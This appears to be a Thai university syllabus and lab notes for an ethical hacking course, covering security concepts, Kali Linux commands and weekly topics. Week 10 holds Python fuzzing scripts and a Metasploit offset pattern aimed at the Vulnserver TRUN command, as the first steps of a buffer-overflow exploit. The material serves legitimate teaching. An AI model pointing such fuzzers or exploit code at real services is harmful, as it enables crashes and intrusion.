# NEIS1308/NETS2403: การเจาะระบบแบบมีจรรยาบรรณ (Ethical Hacking and Penetration Testing)

## รายละเอียดรายวิชา
ระบบเครือข่ายและระบบปฏิบัคิการในเชิงลึก เพื่อหาข้อบกพร่องหรือช่องโหว่ ขั้นตอนการทดลองเจาะระบบเทคนิคและเครื่องมือที่ใช้ในการเจาะระบบ การหาจุดบกพร่องของซอฟต์แวร์ การถอดรหัสลับ ไวรัส โทรจัน การดักจับข้อมูล การหาข้อมูลด้านความปลอดภัยจากอินเทอร์เน็ต การทดลองเจาะระบบเว็บไซต์ การตรวจสอบความปลอดภัยเครือข่ายไร้สาย กลไกในการป้องกันระบบจากการบุกรุก การสร้างเครื่องมือสำหรับผู้ทดสอบระบบ จริยธรรมและจรรยาบรรณสำหรับผู้ทดสอบเจาะระบบ การกู้คืนข้อมูล การหาข้อมูล การหาร่องรอยจากการบุกรุกทั้งภายในและภายนอก พ.ร.บ.ว่าด้วยการกระทำความผิดเกี่ยวกับคอมพิวเตอร์

---
ม.เทคโนโลยีมหานคร อาคาร Q ห้อง Q101 

คาบ SAT2: 1030 - 1300

คาบ SAT3: 1330 - 1600

--- 
## Course Syllabus
- Course Introduction
- Network Refresher
- Ethical Hacking Methodology
- Information Gathering
- Scanning & Enumeration
- Vulnerability Scan
- Cryptography
- Exploitation
- Exploit Development (Buffer Overflows) 
- Privilege Escalation
- Wireless attack
- Web Attack
- พ.ร.บ.ไซเบอร์ และ Cyberrsecurity Framework

---
## Week 1@26 Nov 2022
## Lec 

### Group Line Prepare and channel for communicate

### Ethical Hacking คืออะไร (Q&A ทีละคน)

### Cybersecurity LIVE attack
- [Cisco Talos intelligence](https://talosintelligence.com/ebc_spam)
- [Digital Attack Map](https://www.digitalattackmap.com/)
- [FireEye Cybermap](https://www.fireeye.com/cyber-map/threat-map.html)
- [Fortinet Threatmap](https://threatmap.fortiguard.com/)
- [Raadware livethreatmap](https://livethreatmap.radware.com/)
  
### What Happens in an Internet Minute in 2022
- [1 min happen](https://localiq.com/blog/what-happens-in-an-internet-minute/)

### Technical Skill 
- Operation System (Windows, Linux, MacOS, etc.)
- Network concept
- Protocol
- Command over security areas

### Non-Technical Skills
- Learining ability 
- Pproblem-Solving skills
- Communication skiills
- Coommmited to security policies 
- Awareness of law, standards and Regulations 
  
### Security Concepts 

### The CIA Triad

C - Confidentiality การรักษาไว้ซึ่งความลับของข้อมูล โดยเป็นการปกป้องข้อมูลและไม่เปิดเผยข้อมูลไปยังผู้ที่ไม่ได้รับอนุญาต 
    
    - Personally Identifiable Information (PII) อยู่ภายใต้ขอบเขตของ confidentiality ซึ่งกล่าวถึงข้อมูลของแต่ละบุคคลที่จะต้องมีการรักษาไว้ซึ่งความลับและไม่ถูกเปิดเผยให้กับผู้ที่ไม่ได้รับอนุญาต ยกตัวอย่างเช่น protected health information (PHI) เป็นการป้องกันข้อมูลทางการแพทย์ของผู้ป่วย จะต้องได้รับการปกป้องให้สามารถเข้าถึงได้เฉพาะบุคคลที่มีได้รับอนุญาตเข้าถึงข้อมูลดังกล่าว เป็นต้น 

I - Integrity ข้อมูลต้องมีความถูกต้องครบถ้วนสมบูรณ์ไม่มีการเปลี่ยนแปลง ดัดแปลง หรือแก้ไขใด ๆ โดยไม่ได้รับอนุญาต
    
    - Data integrity เป็นการบ่งบอกว่าข้อมูลดังกล่าวจะต้องไม่ถูกเปลี่ยนแปลงใดๆ จากผู้ที่ไม่มีสิทธิ โดยจะต้องมีการป้องกันข้อมูลภายในระบบ เพื่อให้สามารถมั่นใจได้ว่าข้อมูลต่าง ๆ จะไม่ถูกเปลี่ยนแปลงไปในขั้นตอน เช่น ระหว่างจัดเก็บข้อมูล, ระหว่างการประมวลผลข้อมูล และระหว่างการส่งต่อข้อมูลได้ 
    
    - System integrity เป็นรูปแบบการจัดทำ Baseline สำหรับระบบ เพื่อให้มั่นใจได้ว่าระบบมีการตั้งค่าไว้อย่างถูกต้องสมบูรณ์โดยที่ไม่ถูกเปลี่ยนแปลงหรือแก้ไขการตั้งค่าแต่อย่างใด 

A - Availability ข้อมูลต้องมีความพร้อมใช้งานเมื่อถูกเรียกใช้ กล่าวคือข้อมูลจะต้องสามารถเข้าถึงได้และสามารถใช้งานได้จากผู้ที่มีสิทธิการเข้าถึงข้อมูลดังกล่าวเมื่อมีการร้องขอ

### Risk 
  - ผลกระทบ (Impact) x แนวโน้มที่จะเกิดเหตุ (Likehood)
### Control
  - Physical Control - การควบคุมทางกายภาพ
  - Technique Control - การควบคุมด้วยเทคเนิค
  - Administrative Control - การควบคุมเชิงนโยบาย

### Penetration Testing Process
- Pre-Exploitation
  - Information Gathering
  - Scanning
  - Enumeration
- Exploitation
  - Remote Exploitation
    - Gain System Access
    - Gain Information
    - Denial of services
    - Privilege Escalation
  - Local Exploitation
    - Bypass Restriction
    - Privilege Escalation
- Post-Exploitation
  - Gathering Sensitive information
  - Manage System/Services
  - Pivoting

### Stages of Hacking Cycles 
- Reconnaissance
  - Passive Reconnaissance
  - Active Reconnaissance 
- Scanning 
- Gaining Access
- Maintain Access
- Clearing Tracks

## Lab 
- Setup environment
- Install [VMWare](https://www.vmware.com/latam/products/workstation-pro/workstation-pro-evaluation.html)/[VirtualBox](https://www.virtualbox.org/)
- Config netowrk for Hypervisor 
  - Host Only
  - NAT
  - NAT Network
  - Bridge Network
- Install [Kali linux](https://www.kali.org/)
--- 
## Week 2@3 Dec 2022
## Lec
- Network Refresher
  - Introduction
  - OSI Model
  - Layer 2
  - Layer 3
  - Layer 4
  - Wellknown Protocols
  - Subnetting
## Lab
- Exploring Kali Linux 
- Sudo Overview 
- Navigating the File System
- Users and Privileges
  ```bash
  useradd test1
  passwd test1
  ```
- Common Network Commands 
  ```bash
  ip a
  ifconfig
  netstat -ant 
  nslookup www.google.com
  ```
- Viewing, Creating and Editing
  ```bash
  nano file1
  cat file1
  tail file1
  head file1
  less file1
  ```
- Install and Update tools
  ```bash
  sudo apt update
  sudo apt upgrade -y
  ```
- Envionmane Variables
  ```bash 
  echo $PATH
  echo $USER
  echo $PWD
  echo $HOME
  # Environment variable can be defined with the export command
  export b=8.8.8.8
  ping -c 2 $b
  # Other environment variables defined by default in Kali Linux
  env
  ```
- Basic History Tricks 
  ```bash
  history
  # Rather than re-typing a long command from our history, we can make use of the history expansion facility. For example, looking back at Listing 34, there are three commands in our history with a line number preceding each one. To re-run the first command, we simply type the ! character followed by the line number, in this case 1, to execute the cat /etc/lsb-release command
  !1
  
  # history shortcut is !!, which repeats the last command that was executed during our terminal session:
  !!
  # By default, the command history is saved to the .bash_history file in the user home directory. 
  cat ~/.bash_history
  ```
  - Redirecting to a new file
  ```bash
  ls 
  echo "test"
  echo "test" > redirection_test.txt
  ls 
  cat redirection_test.txt
  echo "Kali linux" > redirection_test.txt
  cat redirection_test.txt
  echo "IS FUN" >> redirection_test.txt
  cat redirection_test.txt
  # As you may have guessed, we can use the < operator to send data the “other way”. In the following example, we redirect the wc command’s STDIN with data originating directly from the file we generated in the previous section. Let’s try this with wc -m which counts characters in the file
  wc -m < redirection_test.txt
  # Redirecting STDERR
  ls .
  ls ./test
  ls ./test 2>error.txt
  cat error.txt
  ```
  - Pipe
  ```bash
  cat error.txt
  cat error.txt | wc -m
  cat error.txt | wc - m > count.txt
  cat count.txt
  ```
  - Grep
  ```bash
  ls -la /usr/bin | grep zip
  ```
  - sed 
  ```bash 
  echo "I need to try hard" | sed 's/hard/harder /'
  ```
  - cut 
  ```bash
  echo "I Hack binaries, web apps, mobile apps, and just about anythong else" | cut -f 2 -d ","

  cut -d ":" -f 1 /etc/passwd
  ``` 
  - awk 
  ```bash
  echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
  ```
  - nano
  - vi/vim
  - Download File
  ```bash
  # The wget command, which we will use extensively, downloads files using the HTTP/HTTPS and FTP protocols. Listing 67 shows the use of wget along with the -O switch to save the destination file with a different name on the local machine
  wget -o filename https://test.test.com
  # curl is a tool to transfer data to or from a server using a host of protocols including IMAP/S, POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP, and others. A penetration tester can use this to download or upload files and build complex requests. 
  curl -o filename https://test.test.com
  # axel is a download accelerator that transfers a file from a FTP or HTTP server through multiple connections. This tool has a vast array of features, but the most common is -n, which is used to specify the number of multiple connections to use. In the following example, we are also using the -a option for a more concise progress indicator and -o to specify a different file name for the downloaded file.
  axel -a -n 20 -o filename https://test.test.com
   ```
  - Alias
  ```bash 
  alias lsa='ls -la'
  lsa
  alias mkdir='ping -c 1 localhost'
  unalias mkdir
  mkdir
  ```
--- 
## Week 3@10 Dec 2022
หยุดรัฐธรรมนูญ

--- 
## Week 4@17 Dec 2022
## Lec
- Ethical Hacking Methodology
- Information Gathering (Reconnaissance) 
## Lab
- Passive Recon
- OSINT Framework
  - Identifying target
  - Discovering Email Address
  - Meltego 
  - Hunting Subdomains 
  - Hunting Webtechnology 
  - GHDB 
- Brupsuit
--- 

## Week 5@24 Dec 2022
## Lec
- Scanning & Enumeration
## Lab
- Scanning with Nmap
- Enumeratimg HTTP
- Enumerating SMB
- Enumeration SSH
- Research Potential Vulnerability 
--- 
## Week 6@31 Dec 2022
หยุดวันสิ้นปีใหม่

--- 
## Week 7@7 Jan 2023
## Lec
- VA Scan
## Lab
- Nessus 
- OpenVAS
- Nakivo

--- 
## Week 8@14 Jan 2023
## Lec
- Cryptography 
- Password Attack
## Lab
- Cyberchef
- Bruteforce Attack
--- 

## Week 9@21 Jan 2023
## Lec
- Exploitation
- Bind Shells and Reverse Shell
## Lab
- Bind Shells and Reverse Shell
- MSF 
--- 

## Week 10@28 Jan 2023
## Lec
- Exploit Development (Buffer Overflows)
- Buffer Overflows 

## Lab
- LAB Preparation 
  - Windows 10 or 7
    - Vulnserver (https://github.com/stephenbradshaw/vulnserver)
    - Immunity Debugger
  - Kali Linux
---
- Spiking 
  - Kali Linux
  - Make Spike script (nano or vim)
  - FIND Vulerable Command by Immunity goto **PAUSED state**

```bash
# Spike script 
# nano stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

```bash
# TRY to RUN script for each command
generic_send_tcp 192.168.x.x 9999 stats.spk 0 0
```
----
- Fuzzing 
  - Python Script for FUZZ
```python
#!/usr/bin/python
#FUZZING Script 
import sys, socket
from time import sleep
buffer = "A" * 100
# Enter IP Address of your HOST Here!!!!
HOST = '............'
PORT = 9999

while True:
  try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.send(('TRUN /. :/' + buffer))
    s.close()
    sleep(1)
    buffer = buffer + "A"*100
  except:
    print "Fuzzing crashed at %s bytes" % str(len(buffer))
    sys.exit()

 ```
--- 
- Find the Offset 
  
Use Tools MSF for find Offset.
  
```bash
# "-l 3000" = 3000 Bytes from previous exercise you will see program stop aarround 3000 Bytes  
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
# Result of command 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
##################
```
Modify Python Script
```python
#!/usr/bin/python
#FUZZING Script 
import sys, socket
from time import sleep
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
# Enter IP Address of your HOST Here!!!!
HOST = '............'
PORT = 9999

while True:
  try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.send(('TRUN /. :/' + offset))
    s.close()
  except:
    print "Error Connection to Server"
    sys.exit()

```

FIND Offfset by copy EIP HEX number to find Offset index 
```bash 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP-HEX-NUMBER>
```

---
- Overwriting the EIP 
- Finding Bad Characters 
- Finding the Right Mudule
- Generating Shellcode and Gaining Root
- Exploit Development


--- 

## Week 11@21 Jan 2023
## Lec
Privilege Escalation
## Lab
Linux Privilege Escalation
  
--- 

## Week 12@28 Jan 2023
## Lec
## Lab
- นักศึกษากลุ่มที่ 1 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
  
--- 

## Week 13@4 Feb 2023
## Lec
## Lab
- นักศึกษากลุ่มที่ 2 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
--- 

## Week 13@11 Feb 2023
## Lec
## Lab
- นักศึกษากลุ่มที่ 3 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
--- 

## Week 14@18 Feb 2023
## Lec
## Lab
- นักศึกษากลุ่มที่ 4 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 

--- 


## Week 15@25 Feb 2023
## Lec
## Lab
- นักศึกษากลุ่มที่ 5 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 

--- 

## Week 16@4 March 2023
## Lec

## Lab 
รายละเอียด LAB Final exam
- สุ่ม Vulhub Image จากรายงานนักศึกษา จำนวน 2 Images เพื่อนำมาทำการทดสอบระบบ
- รายงานผลการเจาะระบบอย่างละเอียด
- A4 1 แผ่น จดอะไรเข้าไปก็ได้ 
--- 

## Week 17@11-26 March 2023
อาจารย์ต้องส่งข้อสอบ Final ก่อนวันที่ 22 Feb 2023

Final Exam Good luck everybody.

--- 
